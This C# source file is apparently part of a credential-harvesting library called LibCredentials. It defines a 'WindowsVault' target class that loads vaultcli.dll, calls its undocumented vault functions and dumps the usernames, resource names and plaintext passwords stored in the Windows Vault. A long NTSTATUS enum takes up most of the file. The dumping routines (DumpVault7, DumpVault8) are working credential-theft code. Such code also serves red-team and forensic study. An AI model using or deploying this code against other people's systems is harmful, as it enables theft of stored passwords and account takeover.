using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using PInvoke;

namespace LibCredentials.Targets
{
    public class WindowsVault : Target
    {
        public enum Ntstatus : uint
        {
            // Success
            Success = 0x00000000,
            Wait0 = 0x00000000,
            Wait1 = 0x00000001,
            Wait2 = 0x00000002,
            Wait3 = 0x00000003,
            Wait63 = 0x0000003f,
            Abandoned = 0x00000080,
            AbandonedWait0 = 0x00000080,
            AbandonedWait1 = 0x00000081,
            AbandonedWait2 = 0x00000082,
            AbandonedWait3 = 0x00000083,
            AbandonedWait63 = 0x000000bf,
            UserApc = 0x000000c0,
            KernelApc = 0x00000100,
            Alerted = 0x00000101,
            Timeout = 0x00000102,
            Pending = 0x00000103,
            Reparse = 0x00000104,
            MoreEntries = 0x00000105,
            NotAllAssigned = 0x00000106,
            SomeNotMapped = 0x00000107,
            OpLockBreakInProgress = 0x00000108,
            VolumeMounted = 0x00000109,
            RxActCommitted = 0x0000010a,
            NotifyCleanup = 0x0000010b,
            NotifyEnumDir = 0x0000010c,
            NoQuotasForAccount = 0x0000010d,
            PrimaryTransportConnectFailed = 0x0000010e,
            PageFaultTransition = 0x00000110,
            PageFaultDemandZero = 0x00000111,
            PageFaultCopyOnWrite = 0x00000112,
            PageFaultGuardPage = 0x00000113,
            PageFaultPagingFile = 0x00000114,
            CrashDump = 0x00000116,
            ReparseObject = 0x00000118,
            NothingToTerminate = 0x00000122,
            ProcessNotInJob = 0x00000123,
            ProcessInJob = 0x00000124,
            ProcessCloned = 0x00000129,
            FileLockedWithOnlyReaders = 0x0000012a,
            FileLockedWithWriters = 0x0000012b,

            // Informational
            Informational = 0x40000000,
            ObjectNameExists = 0x40000000,
            ThreadWasSuspended = 0x40000001,
            WorkingSetLimitRange = 0x40000002,
            ImageNotAtBase = 0x40000003,
            RegistryRecovered = 0x40000009,

            // Warning
            Warning = 0x80000000,
            GuardPageViolation = 0x80000001,
            DatatypeMisalignment = 0x80000002,
            Breakpoint = 0x80000003,
            SingleStep = 0x80000004,
            BufferOverflow = 0x80000005,
            NoMoreFiles = 0x80000006,
            HandlesClosed = 0x8000000a,
            PartialCopy = 0x8000000d,
            DeviceBusy = 0x80000011,
            InvalidEaName = 0x80000013,
            EaListInconsistent = 0x80000014,
            NoMoreEntries = 0x8000001a,
            LongJump = 0x80000026,
            DllMightBeInsecure = 0x8000002b,

            // Error
            Error = 0xc0000000,
            Unsuccessful = 0xc0000001,
            NotImplemented = 0xc0000002,
            InvalidInfoClass = 0xc0000003,
            InfoLengthMismatch = 0xc0000004,
            AccessViolation = 0xc0000005,
            InPageError = 0xc0000006,
            PagefileQuota = 0xc0000007,
            InvalidHandle = 0xc0000008,
            BadInitialStack = 0xc0000009,
            BadInitialPc = 0xc000000a,
            InvalidCid = 0xc000000b,
            TimerNotCanceled = 0xc000000c,
            InvalidParameter = 0xc000000d,
            NoSuchDevice = 0xc000000e,
            NoSuchFile = 0xc000000f,
            InvalidDeviceRequest = 0xc0000010,
            EndOfFile = 0xc0000011,
            WrongVolume = 0xc0000012,
            NoMediaInDevice = 0xc0000013,
            NoMemory = 0xc0000017,
            NotMappedView = 0xc0000019,
            UnableToFreeVm = 0xc000001a,
            UnableToDeleteSection = 0xc000001b,
            IllegalInstruction = 0xc000001d,
            AlreadyCommitted = 0xc0000021,
            AccessDenied = 0xc0000022,
            BufferTooSmall = 0xc0000023,
            ObjectTypeMismatch = 0xc0000024,
            NonContinuableException = 0xc0000025,
            BadStack = 0xc0000028,
            NotLocked = 0xc000002a,
            NotCommitted = 0xc000002d,
            InvalidParameterMix = 0xc0000030,
            ObjectNameInvalid = 0xc0000033,
            ObjectNameNotFound = 0xc0000034,
            ObjectNameCollision = 0xc0000035,
            ObjectPathInvalid = 0xc0000039,
            ObjectPathNotFound = 0xc000003a,
            ObjectPathSyntaxBad = 0xc000003b,
            DataOverrun = 0xc000003c,
            DataLate = 0xc000003d,
            DataError = 0xc000003e,
            CrcError = 0xc000003f,
            SectionTooBig = 0xc0000040,
            PortConnectionRefused = 0xc0000041,
            InvalidPortHandle = 0xc0000042,
            SharingViolation = 0xc0000043,
            QuotaExceeded = 0xc0000044,
            InvalidPageProtection = 0xc0000045,
            MutantNotOwned = 0xc0000046,
            SemaphoreLimitExceeded = 0xc0000047,
            PortAlreadySet = 0xc0000048,
            SectionNotImage = 0xc0000049,
            SuspendCountExceeded = 0xc000004a,
            ThreadIsTerminating = 0xc000004b,
            BadWorkingSetLimit = 0xc000004c,
            IncompatibleFileMap = 0xc000004d,
            SectionProtection = 0xc000004e,
            EasNotSupported = 0xc000004f,
            EaTooLarge = 0xc0000050,
            NonExistentEaEntry = 0xc0000051,
            NoEasOnFile = 0xc0000052,
            EaCorruptError = 0xc0000053,
            FileLockConflict = 0xc0000054,
            LockNotGranted = 0xc0000055,
            DeletePending = 0xc0000056,
            CtlFileNotSupported = 0xc0000057,
            UnknownRevision = 0xc0000058,
            RevisionMismatch = 0xc0000059,
            InvalidOwner = 0xc000005a,
            InvalidPrimaryGroup = 0xc000005b,
            NoImpersonationToken = 0xc000005c,
            CantDisableMandatory = 0xc000005d,
            NoLogonServers = 0xc000005e,
            NoSuchLogonSession = 0xc000005f,
            NoSuchPrivilege = 0xc0000060,
            PrivilegeNotHeld = 0xc0000061,
            InvalidAccountName = 0xc0000062,
            UserExists = 0xc0000063,
            NoSuchUser = 0xc0000064,
            GroupExists = 0xc0000065,
            NoSuchGroup = 0xc0000066,
            MemberInGroup = 0xc0000067,
            MemberNotInGroup = 0xc0000068,
            LastAdmin = 0xc0000069,
            WrongPassword = 0xc000006a,
            IllFormedPassword = 0xc000006b,
            PasswordRestriction = 0xc000006c,
            LogonFailure = 0xc000006d,
            AccountRestriction = 0xc000006e,
            InvalidLogonHours = 0xc000006f,
            InvalidWorkstation = 0xc0000070,
            PasswordExpired = 0xc0000071,
            AccountDisabled = 0xc0000072,
            NoneMapped = 0xc0000073,
            TooManyLuidsRequested = 0xc0000074,
            LuidsExhausted = 0xc0000075,
            InvalidSubAuthority = 0xc0000076,
            InvalidAcl = 0xc0000077,
            InvalidSid = 0xc0000078,
            InvalidSecurityDescr = 0xc0000079,
            ProcedureNotFound = 0xc000007a,
            InvalidImageFormat = 0xc000007b,
            NoToken = 0xc000007c,
            BadInheritanceAcl = 0xc000007d,
            RangeNotLocked = 0xc000007e,
            DiskFull = 0xc000007f,
            ServerDisabled = 0xc0000080,
            ServerNotDisabled = 0xc0000081,
            TooManyGuidsRequested = 0xc0000082,
            GuidsExhausted = 0xc0000083,
            InvalidIdAuthority = 0xc0000084,
            AgentsExhausted = 0xc0000085,
            InvalidVolumeLabel = 0xc0000086,
            SectionNotExtended = 0xc0000087,
            NotMappedData = 0xc0000088,
            ResourceDataNotFound = 0xc0000089,
            ResourceTypeNotFound = 0xc000008a,
            ResourceNameNotFound = 0xc000008b,
            ArrayBoundsExceeded = 0xc000008c,
            FloatDenormalOperand = 0xc000008d,
            FloatDivideByZero = 0xc000008e,
            FloatInexactResult = 0xc000008f,
            FloatInvalidOperation = 0xc0000090,
            FloatOverflow = 0xc0000091,
            FloatStackCheck = 0xc0000092,
            FloatUnderflow = 0xc0000093,
            IntegerDivideByZero = 0xc0000094,
            IntegerOverflow = 0xc0000095,
            PrivilegedInstruction = 0xc0000096,
            TooManyPagingFiles = 0xc0000097,
            FileInvalid = 0xc0000098,
            InstanceNotAvailable = 0xc00000ab,
            PipeNotAvailable = 0xc00000ac,
            InvalidPipeState = 0xc00000ad,
            PipeBusy = 0xc00000ae,
            IllegalFunction = 0xc00000af,
            PipeDisconnected = 0xc00000b0,
            PipeClosing = 0xc00000b1,
            PipeConnected = 0xc00000b2,
            PipeListening = 0xc00000b3,
            InvalidReadMode = 0xc00000b4,
            IoTimeout = 0xc00000b5,
            FileForcedClosed = 0xc00000b6,
            ProfilingNotStarted = 0xc00000b7,
            ProfilingNotStopped = 0xc00000b8,
            NotSameDevice = 0xc00000d4,
            FileRenamed = 0xc00000d5,
            CantWait = 0xc00000d8,
            PipeEmpty = 0xc00000d9,
            CantTerminateSelf = 0xc00000db,
            InternalError = 0xc00000e5,
            InvalidParameter1 = 0xc00000ef,
            InvalidParameter2 = 0xc00000f0,
            InvalidParameter3 = 0xc00000f1,
            InvalidParameter4 = 0xc00000f2,
            InvalidParameter5 = 0xc00000f3,
            InvalidParameter6 = 0xc00000f4,
            InvalidParameter7 = 0xc00000f5,
            InvalidParameter8 = 0xc00000f6,
            InvalidParameter9 = 0xc00000f7,
            InvalidParameter10 = 0xc00000f8,
            InvalidParameter11 = 0xc00000f9,
            InvalidParameter12 = 0xc00000fa,
            MappedFileSizeZero = 0xc000011e,
            TooManyOpenedFiles = 0xc000011f,
            Cancelled = 0xc0000120,
            CannotDelete = 0xc0000121,
            InvalidComputerName = 0xc0000122,
            FileDeleted = 0xc0000123,
            SpecialAccount = 0xc0000124,
            SpecialGroup = 0xc0000125,
            SpecialUser = 0xc0000126,
            MembersPrimaryGroup = 0xc0000127,
            FileClosed = 0xc0000128,
            TooManyThreads = 0xc0000129,
            ThreadNotInProcess = 0xc000012a,
            TokenAlreadyInUse = 0xc000012b,
            PagefileQuotaExceeded = 0xc000012c,
            CommitmentLimit = 0xc000012d,
            InvalidImageLeFormat = 0xc000012e,
            InvalidImageNotMz = 0xc000012f,
            InvalidImageProtect = 0xc0000130,
            InvalidImageWin16 = 0xc0000131,
            LogonServer = 0xc0000132,
            DifferenceAtDc = 0xc0000133,
            SynchronizationRequired = 0xc0000134,
            DllNotFound = 0xc0000135,
            IoPrivilegeFailed = 0xc0000137,
            OrdinalNotFound = 0xc0000138,
            EntryPointNotFound = 0xc0000139,
            ControlCExit = 0xc000013a,
            PortNotSet = 0xc0000353,
            DebuggerInactive = 0xc0000354,
            CallbackBypass = 0xc0000503,
            PortClosed = 0xc0000700,
            MessageLost = 0xc0000701,
            InvalidMessage = 0xc0000702,
            RequestCanceled = 0xc0000703,
            RecursiveDispatch = 0xc0000704,
            LpcReceiveBufferExpected = 0xc0000705,
            LpcInvalidConnectionUsage = 0xc0000706,
            LpcRequestsNotAllowed = 0xc0000707,
            ResourceInUse = 0xc0000708,
            ProcessIsProtected = 0xc0000712,
            VolumeDirty = 0xc0000806,
            FileCheckedOut = 0xc0000901,
            CheckOutRequired = 0xc0000902,
            BadFileType = 0xc0000903,
            FileTooLarge = 0xc0000904,
            FormsAuthRequired = 0xc0000905,
            VirusInfected = 0xc0000906,
            VirusDeleted = 0xc0000907,
            TransactionalConflict = 0xc0190001,
            InvalidTransaction = 0xc0190002,
            TransactionNotActive = 0xc0190003,
            TmInitializationFailed = 0xc0190004,
            RmNotActive = 0xc0190005,
            RmMetadataCorrupt = 0xc0190006,
            TransactionNotJoined = 0xc0190007,
            DirectoryNotRm = 0xc0190008,
            CouldNotResizeLog = 0xc0190009,
            TransactionsUnsupportedRemote = 0xc019000a,
            LogResizeInvalidSize = 0xc019000b,
            RemoteFileVersionMismatch = 0xc019000c,
            CrmProtocolAlreadyExists = 0xc019000f,
            TransactionPropagationFailed = 0xc0190010,
            CrmProtocolNotFound = 0xc0190011,
            TransactionSuperiorExists = 0xc0190012,
            TransactionRequestNotValid = 0xc0190013,
            TransactionNotRequested = 0xc0190014,
            TransactionAlreadyAborted = 0xc0190015,
            TransactionAlreadyCommitted = 0xc0190016,
            TransactionInvalidMarshallBuffer = 0xc0190017,
            CurrentTransactionNotValid = 0xc0190018,
            LogGrowthFailed = 0xc0190019,
            ObjectNoLongerExists = 0xc0190021,
            StreamMiniversionNotFound = 0xc0190022,
            StreamMiniversionNotValid = 0xc0190023,
            MiniversionInaccessibleFromSpecifiedTransaction = 0xc0190024,
            CantOpenMiniversionWithModifyIntent = 0xc0190025,
            CantCreateMoreStreamMiniversions = 0xc0190026,
            HandleNoLongerValid = 0xc0190028,
            NoTxfMetadata = 0xc0190029,
            LogCorruptionDetected = 0xc0190030,
            CantRecoverWithHandleOpen = 0xc0190031,
            RmDisconnected = 0xc0190032,
            EnlistmentNotSuperior = 0xc0190033,
            RecoveryNotNeeded = 0xc0190034,
            RmAlreadyStarted = 0xc0190035,
            FileIdentityNotPersistent = 0xc0190036,
            CantBreakTransactionalDependency = 0xc0190037,
            CantCrossRmBoundary = 0xc0190038,
            TxfDirNotEmpty = 0xc0190039,
            IndoubtTransactionsExist = 0xc019003a,
            TmVolatile = 0xc019003b,
            RollbackTimerExpired = 0xc019003c,
            TxfAttributeCorrupt = 0xc019003d,
            EfsNotAllowedInTransaction = 0xc019003e,
            TransactionalOpenNotAllowed = 0xc019003f,
            TransactedMappingUnsupportedRemote = 0xc0190040,
            TxfMetadataAlreadyPresent = 0xc0190041,
            TransactionScopeCallbacksNotSet = 0xc0190042,
            TransactionRequiredPromotion = 0xc0190043,
            CannotExecuteFileInTransaction = 0xc0190044,
            TransactionsNotFrozen = 0xc0190045,

            MaximumNtStatus = 0xffffffff
        }

        private static readonly Guid Valutdir = new Guid(new byte[]
            {0x42, 0xC4, 0xF4, 0x4B, 0x8A, 0x9B, 0xA0, 0x41, 0xB3, 0x80, 0xDD, 0x4A, 0x70, 0x4D, 0xDB, 0x28});

        private static readonly Guid Vaultfile = new Guid(new byte[]
            {0x99, 0x54, 0xCD, 0x3C, 0xA8, 0x87, 0x10, 0x4B, 0xA2, 0x15, 0x60, 0x88, 0x88, 0xDD, 0x3B, 0x55});

        private Kernel32.SafeLibraryHandle _hVaultCliDll;
        private VaultCloseVaultT _pVaultCloseVault;
        private VaultEnumerateItemsT _pVaultEnumerateItems;
        private VaultFreeT _pVaultFree;
        private IntPtr _pVaultGetItem;
        private VaultOpenVaultT _pVaultOpenVault;

        private bool Init()
        {
            _hVaultCliDll = Kernel32.LoadLibrary("vaultcli.dll");
            if (_hVaultCliDll == Kernel32.SafeLibraryHandle.Null)
            {
                Console.WriteLine("Cannot load vaultcli.dll library");
                return false;
            }

            _pVaultOpenVault = (VaultOpenVaultT) Marshal.GetDelegateForFunctionPointer(
                Kernel32.GetProcAddress(_hVaultCliDll, "VaultOpenVault"), typeof(VaultOpenVaultT));

            _pVaultCloseVault = (VaultCloseVaultT) Marshal.GetDelegateForFunctionPointer(
                Kernel32.GetProcAddress(_hVaultCliDll, "VaultCloseVault"), typeof(VaultCloseVaultT));

            _pVaultEnumerateItems = (VaultEnumerateItemsT) Marshal.GetDelegateForFunctionPointer(
                Kernel32.GetProcAddress(_hVaultCliDll, "VaultEnumerateItems"), typeof(VaultEnumerateItemsT));

            _pVaultGetItem = Kernel32.GetProcAddress(_hVaultCliDll, "VaultGetItem");

            _pVaultFree = (VaultFreeT) Marshal.GetDelegateForFunctionPointer(
                Kernel32.GetProcAddress(_hVaultCliDll, "VaultFree"), typeof(VaultFreeT));

            if ((_pVaultOpenVault == null) || (_pVaultEnumerateItems == null) ||
                (_pVaultCloseVault == null) || (_pVaultGetItem == IntPtr.Zero) || (_pVaultFree == null))
            {
                Console.WriteLine("Cannot load vaultcli.dll functions");
                return false;
            }
            return true;
        }

        private void Unload()
        {
            // Free library (not needed with SafeLibraryHandle?)
            //if (_hVaultCliDll != IntPtr.Zero) 
            //Kernel32.FreeLibrary(_hVaultCliDll);
        }

        protected override void _GetCredentials(List<Credential> credentials)
        {
            if (!Init())
                return;

            // Obtain the password Vault handler
            var hVault = IntPtr.Zero;

            var pinnedArray = GCHandle.Alloc(Valutdir, GCHandleType.Pinned);
            var pointer = pinnedArray.AddrOfPinnedObject();
            var res = _pVaultOpenVault(pointer, 0, out hVault);
            pinnedArray.Free();

            if (res != 0)
            {
                Console.WriteLine("Cannot open vault. Error ({0:D})", res);
                return;
            }

            // Enumerate password vault items
            uint count = 0;
            var pBuffer = IntPtr.Zero;
            res = _pVaultEnumerateItems(hVault, 512, ref count, out pBuffer);
            if (res != 0)
            {
                Console.WriteLine("Cannot enumerate vault items. Error ({0:D})", res);
                return;
            }

            if (count > 0)
                if ((Environment.OSVersion.Version.Major == 6) && (Environment.OSVersion.Version.Minor == 1))
                    DumpVault7(hVault, pBuffer, count, credentials);
                else if ((Environment.OSVersion.Version.Major >= 6) && (Environment.OSVersion.Version.Minor >= 2))
                    DumpVault8(hVault, pBuffer, count, credentials);

            // Free the buffer if necessary
            if (pBuffer != IntPtr.Zero)
                _pVaultFree(pBuffer);

            // Close the password Vault handler
            if (hVault != IntPtr.Zero)
            {
                res = _pVaultCloseVault(hVault);
                if (res != 0)
                    Console.WriteLine("Cannot close vault. Error ({0:D})", res);
            }

            Unload();
        }

        private void DumpVault7(IntPtr hVault, IntPtr pBuffer, uint count, List<Credential> creds)
        {
            // Get the password for every item present in the default windows vault location
            for (uint i = 0; i < count; i++)
            {
                var pItem = (VaultItemWin7)
                    Marshal.PtrToStructure(new IntPtr(pBuffer.ToInt64() + i*Marshal.SizeOf(typeof(VaultItemWin7))),
                        typeof(VaultItemWin7));

                if (!pItem.Id.Equals(Vaultfile))
                    return;

                var credential = new Credential(TargetTypes.WindowsVault)
                {
                    Username = Marshal.PtrToStringAuto(pItem.PUsername + 32),
                    Extra = "Name: " + Marshal.PtrToStringAuto(pItem.PName) + " | " +
                            "Resource: " + Marshal.PtrToStringAuto(pItem.PResource + 32)
                };
                creds.Add(credential);

                var getVaultItem = (VaultGetItemWin7T)
                    Marshal.GetDelegateForFunctionPointer(_pVaultGetItem, typeof(VaultGetItemWin7T));

                var unmanagedPointer = Marshal.AllocHGlobal(16);
                Marshal.Copy(pItem.Id.ToByteArray(), 0, unmanagedPointer, 16);

                var pBuffer2 = IntPtr.Zero;
                if (
                    getVaultItem(hVault, unmanagedPointer, pItem.PResource, pItem.PUsername, IntPtr.Zero, 0,
                        out pBuffer2) == 0)
                {
                    pItem = (VaultItemWin7) Marshal.PtrToStructure(pBuffer2, typeof(VaultItemWin7));
                    credential.Password = Marshal.PtrToStringAuto(pItem.PPassword + 32);
                }

                Marshal.FreeHGlobal(unmanagedPointer);

                // Free the buffer if necessary
                if (pBuffer2 != IntPtr.Zero)
                    _pVaultFree(pBuffer2);
            }
        }

        private void DumpVault8(IntPtr hVault, IntPtr pBuffer, uint count, List<Credential> creds)
        {
            // Get the password for every item present in the default windows vault location
            for (uint i = 0; i < count; i++)
            {
                var pItem = (VaultItemWin8)
                    Marshal.PtrToStructure(new IntPtr(pBuffer.ToInt64() + i*Marshal.SizeOf(typeof(VaultItemWin8))),
                        typeof(VaultItemWin8));

                if (!pItem.Id.Equals(Vaultfile))
                    return;

                var credential = new Credential(TargetTypes.WindowsVault)
                {
                    Username = Marshal.PtrToStringAuto(pItem.PUsername + 32),
                    Extra = "Name: " + Marshal.PtrToStringAuto(pItem.PName) + " | " +
                            "Resource: " + Marshal.PtrToStringAuto(pItem.PResource + 32)
                };
                creds.Add(credential);

                var getVaultItem = (VaultGetItemWin8T)
                    Marshal.GetDelegateForFunctionPointer(_pVaultGetItem, typeof(VaultGetItemWin8T));

                var unmanagedPointer = Marshal.AllocHGlobal(16);
                Marshal.Copy(pItem.Id.ToByteArray(), 0, unmanagedPointer, 16);

                var pBuffer2 = IntPtr.Zero;
                if (
                    getVaultItem(hVault, unmanagedPointer, pItem.PResource, pItem.PUsername, IntPtr.Zero, 0, 0,
                        out pBuffer2) == 0)
                {
                    pItem = (VaultItemWin8) Marshal.PtrToStructure(pBuffer2, typeof(VaultItemWin8));
                    credential.Password = Marshal.PtrToStringAuto(pItem.PPassword + 32);
                }

                Marshal.FreeHGlobal(unmanagedPointer);

                // Free the buffer if necessary
                if (pBuffer2 != IntPtr.Zero)
                    _pVaultFree(pBuffer2);
            }
        }

        private delegate Ntstatus VaultOpenVaultT(IntPtr parm1, uint parm2, out IntPtr parm3);

        private delegate Ntstatus VaultCloseVaultT(IntPtr parm);

        private delegate Ntstatus VaultEnumerateItemsT(IntPtr hVault, int parm2, ref uint parm3, out IntPtr parm4);

        private delegate Ntstatus VaultGetItemWin8T(IntPtr hVault, IntPtr parm2, IntPtr parm3, IntPtr parm4,
            IntPtr parm5, int parm6, int parm7, out IntPtr parm8);

        private delegate Ntstatus VaultGetItemWin7T(IntPtr hVault, IntPtr parm2, IntPtr parm3, IntPtr parm4,
            IntPtr parm5, int parm6, out IntPtr parm7);

        private delegate Ntstatus VaultFreeT(IntPtr parm);

        [StructLayout(LayoutKind.Sequential)]
        private struct VaultItemWin7
        {
            //public unsafe fixed byte id [16];
            public readonly Guid Id;
            public readonly IntPtr PName;
            public readonly IntPtr PResource;
            public readonly IntPtr PUsername;
            public readonly IntPtr PPassword;
            public readonly uint Unknown0;
            public readonly uint Unknown1;
            public readonly uint Unknown2;
            public readonly uint Unknown3;
            public readonly uint Unknown4;
            // unsigned char unknown0[8];
            // unsigned char unknown1[8];
            // DWORD unknown3;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct VaultItemWin8
        {
            //public unsafe fixed byte id [16];
            public readonly Guid Id;
            public readonly IntPtr PName;
            public readonly IntPtr PResource;
            public readonly IntPtr PUsername;
            public readonly IntPtr PPassword;
            public readonly uint Unknown0;
            public readonly uint Unknown1;
            public readonly uint Unknown2;
            public readonly uint Unknown3;
            public readonly uint Unknown4;
            public readonly uint Unknown5;
        }
    }
}